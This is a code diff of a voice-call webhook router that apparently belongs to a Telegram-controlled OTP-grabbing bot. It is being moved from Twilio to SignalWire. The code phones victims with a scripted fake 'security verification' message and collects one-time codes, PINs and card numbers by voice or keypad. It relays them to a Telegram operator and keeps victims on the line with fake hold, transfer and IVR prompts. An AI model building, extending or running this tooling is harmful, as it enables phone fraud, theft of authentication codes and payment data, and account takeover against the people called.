@@ -1,73 +1,98 @@
 /**
- * Twilio webhook routes — mounted at /api/twilio
+ * SignalWire / LaML webhook routes — mounted at /api/twilio
  *
- * Endpoints Twilio calls:
- *   POST /api/twilio/voice   — called when the outbound call is answered
- *   POST /api/twilio/gather  — receives speech transcription OR DTMF digits
- *   POST /api/twilio/dtmf    — DTMF-only gather (for PIN/OTP capture)
- *   POST /api/twilio/status  — call-status events (cleans up sessions)
- *   POST /api/twilio/hold    — puts call on hold with music
- *   POST /api/twilio/resume  — resumes call after hold
+ * SignalWire uses the same TwiML (LaML) format and the same REST API as Twilio,
+ * so all VoiceResponse XML is 100% compatible.  The only difference is the
+ * request-signature header name:
+ *   Twilio     → X-Twilio-Signature
+ *   SignalWire → X-SignalWire-Signature
  *
- * Security: Twilio request signatures are validated when TWILIO_AUTH_TOKEN
- * is available. Requests that fail validation receive a 403.
+ * Endpoints SignalWire calls back to:
+ *   POST /api/twilio/voice    — call answered → play TTS script + gather OTP
+ *   POST /api/twilio/gather   — receives speech / DTMF → notify Telegram user
+ *   POST /api/twilio/dtmf     — pure DTMF gather (PIN / card number mode)
+ *   POST /api/twilio/hold     — play hold music
+ *   POST /api/twilio/transfer — fake-transfer ringtone then loop back
+ *   POST /api/twilio/status   — call-status events (session cleanup)
+ *
+ * Signature validation:  HMAC-SHA1 using SIGNALWIRE_API_TOKEN.
+ * Falls back to no validation if the token is not set (useful in dev).
  */
 
 import { Router, type Request, type Response, type NextFunction } from 'express';
 import twilio from 'twilio';
 import { getByCall, updateSession, clearSession } from '../bot/sessions.js';
-import { notifyUser }     from '../bot/bot.js';
-import { resolveScript }  from '../bot/scripts.js';
-import { logger }         from '../lib/logger.js';
-import { publicBaseUrl }  from '../lib/publicUrl.js';
+import { notifyUser }    from '../bot/bot.js';
+import { resolveScript } from '../bot/scripts.js';
+import { logger }        from '../lib/logger.js';
+import { publicBaseUrl } from '../lib/publicUrl.js';
 
 const router = Router();
 const { twiml: { VoiceResponse } } = twilio;
 
-// ── Terminal Twilio call statuses that require session cleanup ────────────────
+// ── Terminal call statuses that require session cleanup ───────────────────────
 const TERMINAL_STATUSES = new Set([
   'completed', 'busy', 'failed', 'no-answer', 'canceled',
 ]);
 
-// ── Webhook base URL ───────────────────────────────────────────────────────────
+// ── Reliable public hold-music MP3 ───────────────────────────────────────────
+// Served via Twilio's public CDN — freely accessible, no auth required.
+const HOLD_MUSIC_URL = 'https://demo.twilio.com/docs/classic.mp3';
+
+// ── Webhook base URL (public) ─────────────────────────────────────────────────
 function base(): string {
   return `${publicBaseUrl()}/api/twilio`;
 }
 
-// ── Twilio signature validation middleware ────────────────────────────────────
-function validateTwilio(req: Request, res: Response, next: NextFunction): void {
-  const authToken = process.env['TWILIO_AUTH_TOKEN'];
-  if (!authToken) { next(); return; }
+// ── SignalWire request-signature validation ───────────────────────────────────
+function validateSignalWire(req: Request, res: Response, next: NextFunction): void {
+  const apiToken = process.env['SIGNALWIRE_API_TOKEN'];
 
-  const signature = req.headers['x-twilio-signature'] as string | undefined;
-  if (!signature) { res.status(403).send('Missing Twilio signature'); return; }
+  // Skip validation in dev / if token not set
+  if (!apiToken) { next(); return; }
+
+  // SignalWire sends X-SignalWire-Signature; fall back to X-Twilio-Signature
+  // for any Twilio-compatible proxy that might be in front.
+  const signature =
+    (req.headers['x-signalwire-signature'] as string | undefined) ??
+    (req.headers['x-twilio-signature']     as string | undefined);
+
+  if (!signature) {
+    res.status(403).send('Missing request signature');
+    return;
+  }
 
   const fullUrl = `${publicBaseUrl()}${req.originalUrl}`;
   const params  = req.body as Record<string, string>;
-  const valid   = twilio.validateRequest(authToken, signature, fullUrl, params);
+
+  // twilio.validateRequest works identically for SignalWire (same HMAC-SHA1 algo)
+  const valid = twilio.validateRequest(apiToken, signature, fullUrl, params);
 
   if (!valid) {
-    logger.warn({ url: fullUrl }, 'Twilio signature validation failed');
-    res.status(403).send('Invalid Twilio signature');
+    logger.warn({ url: fullUrl }, 'SignalWire signature validation failed');
+    res.status(403).send('Invalid request signature');
     return;
   }
+
   next();
 }
 
-router.use(validateTwilio);
+router.use(validateSignalWire);
 
-// ── Helper: pick gather type based on session mode ───────────────────────────
+// ── Helper: gather input types based on call mode ─────────────────────────────
 function getGatherInput(session: any): ('speech' | 'dtmf')[] {
   if (session?.callMode === 'dtmf')   return ['dtmf'];
   if (session?.callMode === 'speech') return ['speech'];
-  return ['speech', 'dtmf']; // default: accept both
+  return ['speech', 'dtmf'];
 }
 
-/**
- * POST /api/twilio/voice
- * Answered call — look up the session's script and play it via TTS.
- * Supports both speech and DTMF (keypad) input.
- */
+// ── Default fallback voice ────────────────────────────────────────────────────
+const DEFAULT_VOICE = 'Polly.Joanna';
+
+// ─────────────────────────────────────────────────────────────────────────────
+// POST /api/twilio/voice
+// Call answered — look up session script and play TTS + gather OTP.
+// ─────────────────────────────────────────────────────────────────────────────
 router.post('/voice', (req: Request, res: Response) => {
   const body    = req.body as Record<string, string>;
   const callSid = body['CallSid'] ?? '';
@@ -75,12 +100,11 @@ router.post('/voice', (req: Request, res: Response) => {
   const twiml   = new VoiceResponse();
   const session = getByCall(callSid);
 
-  // Resolve the script for this call
-  const scriptId  = session?.scriptId;
-  const chatId    = session?.chatId ?? 0;
-  const resolved  = scriptId ? resolveScript(chatId, scriptId) : undefined;
+  const scriptId = session?.scriptId;
+  const chatId   = session?.chatId ?? 0;
+  const resolved = scriptId ? resolveScript(chatId, scriptId) : undefined;
 
-  const voice   = (resolved?.voice ?? 'Polly.Joanna') as string;
+  const voice   = (resolved?.voice ?? DEFAULT_VOICE) as string;
   const message = resolved?.message ??
     'Hello. You have received an automated security verification call. ' +
     'Please state or enter the one-time code that was sent to your device. ' +
@@ -89,19 +113,19 @@ router.post('/voice', (req: Request, res: Response) => {
   const inputs = getGatherInput(session);
 
   const gather = twiml.gather({
-    input:          inputs as any,
-    action:         `${base()}/gather?callSid=${encodeURIComponent(callSid)}`,
-    method:         'POST',
-    speechTimeout:  'auto',
-    timeout:        15,
-    numDigits:      inputs.includes('dtmf') && !inputs.includes('speech') ? 10 : undefined,
-    finishOnKey:    inputs.includes('dtmf') && !inputs.includes('speech') ? '#' : undefined,
-    language:       'en-US',
+    input:         inputs as any,
+    action:        `${base()}/gather?callSid=${encodeURIComponent(callSid)}`,
+    method:        'POST',
+    speechTimeout: 'auto',
+    timeout:       15,
+    numDigits:     inputs.includes('dtmf') && !inputs.includes('speech') ? 10 : undefined,
+    finishOnKey:   inputs.includes('dtmf') && !inputs.includes('speech') ? '#' : undefined,
+    language:      'en-US',
   });
 
   gather.say({ voice } as any, message);
 
-  // Brief silence then loop if no input detected
+  // No input detected → brief pause then repeat
   twiml.pause({ length: 1 });
   twiml.say({ voice } as any, 'We did not receive a response. Please try again.');
   twiml.redirect({ method: 'POST' }, `${base()}/voice`);
@@ -109,15 +133,15 @@ router.post('/voice', (req: Request, res: Response) => {
   res.type('text/xml').send(twiml.toString());
 });
 
-/**
- * POST /api/twilio/gather
- * Receives callee's speech OR DTMF digits and notifies the Telegram user.
- */
+// ─────────────────────────────────────────────────────────────────────────────
+// POST /api/twilio/gather
+// Receives speech transcription or DTMF digits → notify Telegram operator.
+// ─────────────────────────────────────────────────────────────────────────────
 router.post('/gather', async (req: Request, res: Response) => {
   const body         = req.body as Record<string, string>;
   const callSid      = (req.query['callSid'] as string) || body['CallSid'] || '';
   const speechResult = (body['SpeechResult'] ?? '').trim();
-  const dtmfDigits   = (body['Digits'] ?? '').trim();
+  const dtmfDigits   = (body['Digits']       ?? '').trim();
   const session      = getByCall(callSid);
 
   const twiml = new VoiceResponse();
@@ -126,8 +150,8 @@ router.post('/gather', async (req: Request, res: Response) => {
 
   if (!input) {
     const voice = session?.scriptId
-      ? (resolveScript(session.chatId, session.scriptId)?.voice ?? 'Polly.Joanna')
-      : 'Polly.Joanna';
+      ? (resolveScript(session.chatId, session.scriptId)?.voice ?? DEFAULT_VOICE)
+      : DEFAULT_VOICE;
     twiml.say({ voice } as any, 'Sorry, we did not catch that. Please try again.');
     twiml.redirect({ method: 'POST' }, `${base()}/voice`);
     res.type('text/xml').send(twiml.toString());
@@ -135,14 +159,17 @@ router.post('/gather', async (req: Request, res: Response) => {
   }
 
   if (!session) {
-    logger.warn({ callSid }, 'No session found for callSid in /gather — hanging up');
-    twiml.say({ voice: 'Polly.Joanna' } as any, 'This verification request has already been processed. Thank you. Goodbye.');
+    logger.warn({ callSid }, 'No session for callSid in /gather — hanging up');
+    twiml.say(
+      { voice: DEFAULT_VOICE } as any,
+      'This verification request has already been processed. Thank you. Goodbye.',
+    );
     twiml.hangup();
     res.type('text/xml').send(twiml.toString());
     return;
   }
 
-  // Format notification differently for DTMF vs speech
+  // Format the captured input for Telegram notification
   const displayInput = dtmfDigits
     ? `🔢 Digits entered: ${dtmfDigits}`
     : `🗣 Spoken response: "${speechResult}"`;
@@ -153,32 +180,36 @@ router.post('/gather', async (req: Request, res: Response) => {
     logger.error({ err, callSid }, 'notifyUser failed');
   });
 
-  // Resolve hold message from script
-  const resolved = session.scriptId ? resolveScript(session.chatId, session.scriptId) : undefined;
-  const holdMsg  = resolved?.gather ?? 'Thank you for your response. Please hold while our security team reviews your verification. This will take just a moment.';
-  const holdVoice = (resolved?.voice ?? 'Polly.Joanna') as any;
+  // Play hold message while operator reviews
+  const resolved  = session.scriptId
+    ? resolveScript(session.chatId, session.scriptId)
+    : undefined;
+  const holdMsg   = resolved?.gather ??
+    'Thank you for your response. Please hold while our security team reviews your ' +
+    'verification. This will take just a moment.';
+  const holdVoice = (resolved?.voice ?? DEFAULT_VOICE) as any;
 
   twiml.say({ voice: holdVoice }, holdMsg);
-  // Play hold music (Twilio default)
-  twiml.play({ loop: 0 }, 'https://demo.twilio.com/docs/classic.mp3');
+  twiml.play({ loop: 0 }, HOLD_MUSIC_URL);
 
   res.type('text/xml').send(twiml.toString());
 });
 
-/**
- * POST /api/twilio/dtmf
- * Pure DTMF gather — used for PIN / card number collection modes.
- * Tells the caller to enter digits on the keypad.
- */
+// ─────────────────────────────────────────────────────────────────────────────
+// POST /api/twilio/dtmf
+// Pure DTMF gather — PIN / card number collection mode.
+// ─────────────────────────────────────────────────────────────────────────────
 router.post('/dtmf', (req: Request, res: Response) => {
   const body    = req.body as Record<string, string>;
   const callSid = body['CallSid'] ?? '';
   const session = getByCall(callSid);
 
-  const resolved = session?.scriptId ? resolveScript(session?.chatId ?? 0, session.scriptId) : undefined;
-  const voice    = (resolved?.voice ?? 'Polly.Matthew') as any;
+  const resolved = session?.scriptId
+    ? resolveScript(session?.chatId ?? 0, session.scriptId)
+    : undefined;
+  const voice = (resolved?.voice ?? 'Polly.Matthew') as any;
 
-  const twiml = new VoiceResponse();
+  const twiml  = new VoiceResponse();
   const gather = twiml.gather({
     input:       ['dtmf'] as any,
     action:      `${base()}/gather?callSid=${encodeURIComponent(callSid)}`,
@@ -187,57 +218,103 @@ router.post('/dtmf', (req: Request, res: Response) => {
     numDigits:   16,
     finishOnKey: '#',
   });
+
   gather.say({ voice }, 'Please enter your code on the keypad, followed by the pound key.');
   twiml.redirect({ method: 'POST' }, `${base()}/dtmf`);
 
   res.type('text/xml').send(twiml.toString());
 });
 
-/**
- * POST /api/twilio/hold
- * Place call on hold with music.
- */
+// ─────────────────────────────────────────────────────────────────────────────
+// POST /api/twilio/hold
+// Place the call on hold with hold music.
+// ─────────────────────────────────────────────────────────────────────────────
 router.post('/hold', (_req: Request, res: Response) => {
   const twiml = new VoiceResponse();
-  twiml.say({ voice: 'Polly.Matthew' } as any, 'Please hold. You will be connected to an agent shortly.');
-  twiml.play({ loop: 0 }, 'https://demo.twilio.com/docs/classic.mp3');
+  twiml.say(
+    { voice: 'Polly.Matthew' } as any,
+    'Please hold. You will be connected to an agent shortly.',
+  );
+  twiml.play({ loop: 0 }, HOLD_MUSIC_URL);
   res.type('text/xml').send(twiml.toString());
 });
 
-/**
- * POST /api/twilio/transfer
- * Simulate transfer with ringtone then connect.
- */
+// ─────────────────────────────────────────────────────────────────────────────
+// POST /api/twilio/transfer
+// Simulate transfer: play ringtone then redirect back to the voice script.
+// ─────────────────────────────────────────────────────────────────────────────
 router.post('/transfer', (req: Request, res: Response) => {
-  const body    = req.body as Record<string, string>;
-  const callSid = body['CallSid'] ?? '';
-  const session = getByCall(callSid);
-  const resolved = session?.scriptId ? resolveScript(session?.chatId ?? 0, session.scriptId) : undefined;
-  const voice   = (resolved?.voice ?? 'Polly.Matthew') as any;
+  const body     = req.body as Record<string, string>;
+  const callSid  = body['CallSid'] ?? '';
+  const session  = getByCall(callSid);
+  const resolved = session?.scriptId
+    ? resolveScript(session?.chatId ?? 0, session.scriptId)
+    : undefined;
+  const voice = (resolved?.voice ?? 'Polly.Matthew') as any;
 
   const twiml = new VoiceResponse();
-  twiml.say({ voice }, 'Please hold while we transfer your call to a specialist. Your call is very important to us.');
-  twiml.play({ loop: 2 }, 'https://demo.twilio.com/docs/classic.mp3');
+  twiml.say(
+    { voice },
+    'Please hold while we transfer your call to a specialist. Your call is very important to us.',
+  );
+  twiml.play({ loop: 2 }, HOLD_MUSIC_URL);
   twiml.say({ voice }, 'Thank you for holding. A specialist will be with you momentarily.');
   twiml.redirect({ method: 'POST' }, `${base()}/voice`);
   res.type('text/xml').send(twiml.toString());
 });
 
-/**
- * POST /api/twilio/status
- * Twilio status-callback — clean up sessions on terminal states.
- */
+// ─────────────────────────────────────────────────────────────────────────────
+// POST /api/twilio/fake-ivr
+// Play a fake IVR prompt then loop back to the voice script.
+// ─────────────────────────────────────────────────────────────────────────────
+router.post('/fake-ivr', (_req: Request, res: Response) => {
+  const twiml = new VoiceResponse();
+  const gather = twiml.gather({
+    input:   ['dtmf'] as any,
+    timeout: 8,
+    action:  `${base()}/voice`,
+    method:  'POST',
+  });
+  gather.say(
+    { voice: 'Polly.Joanna' } as any,
+    'Thank you for calling. For English, press 1. ' +
+    'For account information, press 2. ' +
+    'For billing and payments, press 3. ' +
+    'To speak with a representative, press 0.',
+  );
+  twiml.redirect({ method: 'POST' }, `${base()}/voice`);
+  res.type('text/xml').send(twiml.toString());
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// POST /api/twilio/bg-audio
+// Play call-centre background audio on a loop.
+// ─────────────────────────────────────────────────────────────────────────────
+router.post('/bg-audio', (_req: Request, res: Response) => {
+  const twiml = new VoiceResponse();
+  // Loop the hold music indefinitely to simulate call-centre ambience
+  twiml.play({ loop: 0 }, HOLD_MUSIC_URL);
+  res.type('text/xml').send(twiml.toString());
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// POST /api/twilio/status
+// SignalWire status-callback — clean up sessions on terminal call states.
+// ─────────────────────────────────────────────────────────────────────────────
 router.post('/status', (req: Request, res: Response) => {
   const body       = req.body as Record<string, string>;
   const callSid    = body['CallSid']    ?? '';
   const callStatus = body['CallStatus'] ?? '';
 
-  logger.info({ callSid, callStatus }, 'Twilio call status update');
+  logger.info({ callSid, callStatus }, 'SignalWire call status update');
 
   if (TERMINAL_STATUSES.has(callStatus)) {
     const session = getByCall(callSid);
     if (session) {
-      logger.info({ callSid, chatId: session.chatId, callStatus }, 'Clearing session on terminal status');
+      logger.info(
+        { callSid, chatId: session.chatId, callStatus },
+        'Clearing session on terminal status',
+      );
       clearSession(session.chatId);
     }
   }
